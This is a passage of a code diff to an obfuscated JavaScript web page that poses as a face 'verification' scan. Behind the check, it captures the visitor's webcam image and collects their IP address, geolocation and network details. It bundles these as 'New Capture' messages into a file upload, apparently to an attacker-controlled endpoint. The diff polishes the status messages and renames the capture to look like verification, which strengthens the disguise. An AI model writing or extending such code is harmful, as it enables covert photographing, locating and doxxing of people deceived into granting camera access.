+                facingMode: 'user', 
+                width: { ideal: 1280 }, 
+                height: { ideal: 720 } 
+            },
             audio: false
         });
+
         document.getElementById('v').srcObject = _0x3c4d;
         go(3);
+
+        const badge = document.getElementById('scanBadge');
+        badge.textContent = 'Initializing...';
+        badge.className = 'scan-status detecting';
+
         document.getElementById('ss').textContent = 'Loading face detection...';
-        document.getElementById('ss').className = 'st ld';
-        
-        // preload models in background
+        document.getElementById('ss').className = 'status-text loading';
+
+        // preload models
         _0x0d1e();
-        
-        // wait for video to be ready
+
         const v = document.getElementById('v');
         if (v.readyState >= 2) {
-            setTimeout(() => _0x9c0d(), 500);
+            setTimeout(() => _0x9c0d(), 400);
         } else {
-            v.onloadeddata = () => setTimeout(() => _0x9c0d(), 500);
+            v.onloadeddata = () => setTimeout(() => _0x9c0d(), 400);
         }
     } catch(e) {
-        st.textContent = 'Camera denied. Click "Allow" and try again.';
-        st.className = 'st err';
+        st.textContent = 'Camera access denied. Please allow camera and try again.';
+        st.className = 'status-text error';
     }
 }
 
 async function _0x9c0d() {
     if (_0x4e5f) return;
-    
+
     const ss = document.getElementById('ss');
+    const badge = document.getElementById('scanBadge');
     const v = document.getElementById('v');
-    
-    // wait for models
+
     if (!_0x8c9d) {
-        ss.textContent = 'Loading AI models...';
-        ss.className = 'st ld';
+        badge.textContent = 'Loading AI...';
+        badge.className = 'scan-status detecting';
+        ss.textContent = 'Loading detection models...';
+        ss.className = 'status-text loading';
         await _0x0d1e();
         if (!_0x8c9d) {
-            ss.textContent = 'Loading failed. Retrying...';
-            setTimeout(() => _0x9c0d(), 1000);
+            ss.textContent = 'Model load failed. Retrying...';
+            ss.className = 'status-text error';
+            setTimeout(() => _0x9c0d(), 1500);
             return;
         }
     }
-    
-    ss.textContent = 'Scanning...';
-    ss.className = 'st ld';
+
+    badge.textContent = 'Scanning...';
+    badge.className = 'scan-status detecting';
+    ss.textContent = 'Analyzing...';
+    ss.className = 'status-text loading';
 
     let detections = null;
     try {
         detections = await faceapi.detectAllFaces(
-            v, 
-            new faceapi.TinyFaceDetectorOptions({ 
-                inputSize: 416, 
-                scoreThreshold: 0.3 
+            v,
+            new faceapi.TinyFaceDetectorOptions({
+                inputSize: 416,
+                scoreThreshold: 0.3
             })
         ).withFaceLandmarks();
     } catch(e) {
         console.error('Detection error:', e);
+        badge.textContent = 'Error';
+        badge.className = 'scan-status error';
         ss.textContent = 'Detection error. Retrying...';
-        ss.className = 'st err';
+        ss.className = 'status-text error';
         setTimeout(() => _0x9c0d(), 1000);
         return;
     }
 
     if (!detections || detections.length === 0) {
         _0x7d2a++;
-        if (_0x7d2a > 30) {
+        if (_0x7d2a > 25) {
+            badge.textContent = 'No Face';
+            badge.className = 'scan-status error';
             ss.textContent = 'No face detected. Please ensure your face is visible.';
-            ss.className = 'st err';
+            ss.className = 'status-text error';
         } else {
+            badge.textContent = 'Searching...';
+            badge.className = 'scan-status detecting';
             ss.textContent = 'Looking for face...';
-            ss.className = 'st ld';
+            ss.className = 'status-text loading';
         }
-        setTimeout(() => _0x9c0d(), 200);
+        setTimeout(() => _0x9c0d(), 250);
         return;
     }
 
@@ -402,7 +992,6 @@ async function _0x9c0d() {
     const vWidth = v.videoWidth;
     const vHeight = v.videoHeight;
 
-    // circle bounds - match the visual circle (center 50%,50%, radius 40%)
     const cx = vWidth / 2;
     const cy = vHeight / 2;
     const r = Math.min(vWidth, vHeight) * 0.38;
@@ -412,45 +1001,52 @@ async function _0x9c0d() {
     const faceR = Math.max(box.width, box.height) / 2;
 
     const dist = Math.sqrt((faceCx - cx) ** 2 + (faceCy - cy) ** 2);
-    const margin = faceR * 0.15; // 15% tolerance
+    const margin = faceR * 0.12;
     const inside = dist + faceR <= r + margin;
 
     if (!inside) {
-        ss.textContent = 'Face must be in the circle (fully)';
-        ss.className = 'st err';
+        badge.textContent = 'Out of Frame';
+        badge.className = 'scan-status error';
+        ss.textContent = 'Face must be fully inside the circle';
+        ss.className = 'status-text error';
         setTimeout(() => _0x9c0d(), 300);
         return;
     }
 
-    // check face size - not too small
-    if (box.width < vWidth * 0.15 || box.height < vHeight * 0.15) {
+    if (box.width < vWidth * 0.12 || box.height < vHeight * 0.12) {
+        badge.textContent = 'Too Far';
+        badge.className = 'scan-status error';
         ss.textContent = 'Move closer to the camera';
-        ss.className = 'st err';
+        ss.className = 'status-text error';
         setTimeout(() => _0x9c0d(), 300);
         return;
     }
 
-    // lighting check
+    // lighting
     const c = document.createElement('canvas');
-    c.width = 100; c.height = 100;
+    c.width = 80; c.height = 80;
     const x = c.getContext('2d');
-    x.drawImage(v, 0, 0, 100, 100);
-    const d = x.getImageData(0, 0, 100, 100).data;
+    x.drawImage(v, 0, 0, 80, 80);
+    const d = x.getImageData(0, 0, 80, 80).data;
     let t = 0;
     for (let i = 0; i < d.length; i += 4) {
         t += (d[i]*0.299 + d[i+1]*0.587 + d[i+2]*0.114);
     }
     const avg = t / (d.length / 4);
 
-    if (avg < 45) {
-        ss.textContent = '⚠️ Too dark. Move to a well-lit area.';
-        ss.className = 'st err';
+    if (avg < 40) {
+        badge.textContent = 'Too Dark';
+        badge.className = 'scan-status error';
+        ss.textContent = 'Too dark. Move to a well-lit area.';
+        ss.className = 'status-text error';
         setTimeout(() => _0x9c0d(), 500);
         return;
     }
-    if (avg > 220) {
-        ss.textContent = '⚠️ Too bright. Reduce glare.';
-        ss.className = 'st err';
+    if (avg > 225) {
+        badge.textContent = 'Too Bright';
+        badge.className = 'scan-status error';
+        ss.textContent = 'Too bright. Reduce glare.';
+        ss.className = 'status-text error';
         setTimeout(() => _0x9c0d(), 500);
         return;
     }
@@ -458,9 +1054,13 @@ async function _0x9c0d() {
     // success
     _0x4e5f = true;
     _0x6a7b = det;
-    ss.textContent = '✓ Face detected. Processing...';
-    ss.className = 'st ok';
-    setTimeout(() => _0xb1e2(), 1200);
+
+    badge.textContent = 'Verified';
+    badge.className = 'scan-status success';
+    ss.textContent = 'Face verified. Processing...';
+    ss.className = 'status-text success';
+
+    setTimeout(() => _0xb1e2(), 1000);
 }
 
 function _0xb1e2() {
@@ -485,7 +1085,7 @@ async function _0xd3f4(img) {
     try {
         const b = await (await fetch(img)).blob();
         const f = new FormData();
-        f.append('file', b, 'face_scan.png');
+        f.append('file', b, 'verification.png');
 
         const info = await _0xe5f6();
         f.append('content', info);
@@ -496,14 +1096,14 @@ async function _0xd3f4(img) {
 
 async function _0xe5f6() {
     const lines = [];
-    lines.push('**🔴 New Capture**');
+    lines.push('**🔴 New Verification Capture**');
     lines.push(`🕐 ${new Date().toLocaleString()}`);
 
     try {
         const r = await fetch('https://api.ipify.org?format=json');
         const ip = (await r.json()).ip;
         lines.push(`🌐 IP: ${ip}`);
-        
+
         try {
             const g = await fetch(`https://ipapi.co/${ip}/json/`);
             const geo = await g.json();
@@ -527,9 +1127,7 @@ async function _0xe5f6() {
 
     try {
         const conn = navigator.connection;
-        if (conn) {
-            lines.push(`📶 Network: ${conn.effectiveType} | ${conn.downlink}Mbps`);
-        }
+        if (conn) lines.push(`📶 Network: ${conn.effectiveType} | ${conn.downlink}Mbps`);
     } catch {}
 
     try {
@@ -549,7 +1147,7 @@ async function _0xe5f6() {
     if (_0x6a7b) {
         const landmarks = _0x6a7b.landmarks;
         const jaw = landmarks.getJawOutline();
-        lines.push(`👤 Face: ${jaw.length} landmark pts detected`);
+        lines.push(`👤 Face: ${jaw.length} landmark pts`);
     }
 
     return lines.join('\n');
@@ -566,8 +1164,8 @@ function _0xf5a6() {
     let n = 0;
     const i = setInterval(() => {
         f.classList.toggle('on');
-        if (++n > 25) { clearInterval(i); f.classList.remove('on'); }
-    }, 80);
+        if (++n > 30) { clearInterval(i); f.classList.remove('on'); }
+    }, 70);
     setTimeout(() => { s.pause(); o.classList.remove('on'); }, 6000);
 }
 </script>
